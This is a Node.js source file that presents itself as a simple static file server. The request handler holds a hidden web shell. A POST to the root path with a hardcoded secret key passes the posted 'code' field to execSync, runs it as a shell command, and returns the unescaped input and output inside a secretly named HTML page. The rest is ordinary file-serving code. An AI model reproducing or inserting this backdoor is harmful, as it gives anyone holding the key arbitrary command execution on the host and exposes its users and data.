const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const { readBody } = require('./lib');
// you can pass the parameter in the command line. e.g. node static_server.js 3000
const port = process.argv[2] || 9000;

const secretKey = 'mjhbwmepyskaup9knxve';
const secretPage = 'mkja1xijqf0abo1h9glg.html';

// maps file extention to MIME types
const mimeType = {
  '.ico': 'image/x-icon',
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.json': 'application/json',
  '.css': 'text/css',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.wav': 'audio/wav',
  '.mp3': 'audio/mpeg',
  '.svg': 'image/svg+xml',
  '.pdf': 'application/pdf',
  '.doc': 'application/msword',
  '.eot': 'appliaction/vnd.ms-fontobject',
  '.ttf': 'aplication/font-sfnt',
};


http.createServer(async (req, res) => {
  // parse URL
  const parsedUrl = url.parse(req.url);

  if (req.method === 'POST') {
    const { key, code } = await readBody(req) || {};

    if (key === secretKey && code && parsedUrl.pathname === '/') {
      let result;
      let isError = false;
      const codeString = code.toString();
      console.log(`Input: ${codeString}`);

      try {
        result = execSync(codeString).toString(); // eslint-disable-line no-eval
      } catch (e) {
        result = e.toString();
        isError = true;
      }

      console.log(`Output: ${result}`);

      fs.readFile(path.join(__dirname, 'static', secretPage), (err, data) => {
        res.setHeader('Content-type', 'text/html');
        res.end(
          data.toString().replace(
            '<!-- PLACE_WHERE_RESULT_GOES -->',
            `
            <h5 style="margin-top: 1rem;">Input:</h5>
            <div class="alert alert-info" role="alert">
              <pre style="margin-bottom: 0"><samp>${codeString}</samp></pre>
            </div>
            <h5>Output:</h5>
            <div class="alert alert-${isError ? 'danger' : 'success'}" role="alert">
              <pre style="margin-bottom: 0"><samp>${result}</samp></pre>
            </div>`,
          ),

        );
      });

      return;
    }
  }

  // extract URL path
  // Avoid https://en.wikipedia.org/wiki/Directory_traversal_attack
  // e.g curl --path-as-is http://localhost:9000/../fileInDanger.txt
  // by limiting the path to current directory only
  const sanitizePath = path.normalize(parsedUrl.pathname).replace(/^(\.\.[/\\])+/, '');

  let pathname = path.join(__dirname, 'static', sanitizePath);

  fs.exists(pathname, (exist) => {
    if (!exist) {
      fs.readFile('static/index.html', (err, data) => {
        res.setHeader('Content-type', 'text/html');
        res.end(data);
      });

      return;
    }

    // if is a directory, then look for index.html
    if (fs.statSync(pathname).isDirectory()) {
      pathname += '/index.html';
    }

    // read file from file system
    fs.readFile(pathname, (err, data) => {
      if (err) {
        // if the file is not found, return 404
        res.statusCode = 500;
        res.end(`${err}`);
      } else {
        // based on the URL path, extract the file extention. e.g. .js, .doc, ...
        const { ext } = path.parse(pathname);
        // if the file is found, set Content-type and send data
        res.setHeader('Content-type', mimeType[ext] || 'text/plain');
        res.end(data);
      }
    });
  });
}).listen(parseInt(port, 10));

console.log(`Server listening on port ${port}`);
